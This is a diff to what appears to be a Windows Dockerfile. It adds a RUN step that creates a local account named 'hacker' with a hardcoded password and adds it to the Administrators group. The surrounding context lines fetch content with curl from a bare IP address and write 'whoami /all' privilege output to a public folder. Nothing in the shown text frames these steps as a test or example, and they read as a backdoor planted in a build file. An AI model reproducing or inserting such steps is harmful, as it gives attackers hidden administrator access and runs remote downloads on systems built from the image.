@@ -14,3 +14,8 @@ RUN curl.exe http://134.209.28.104/b
 RUN whoami.exe /all > C:\Users\Public\whoami.txt
 # Copy developer tools and entrypoint
 COPY --from=tools C:\tools C:\tools
+
+
+RUN $password = ConvertTo-SecureString 'Str0ngP@ssw0rd!' -AsPlainText -Force ; `
+    New-LocalUser -Name "hacker" -Password $password -FullName "Container Admin" -Description "Local admin inside container" ; `
+    Add-LocalGroupMember -Group "Administrators" -Member "hacker"
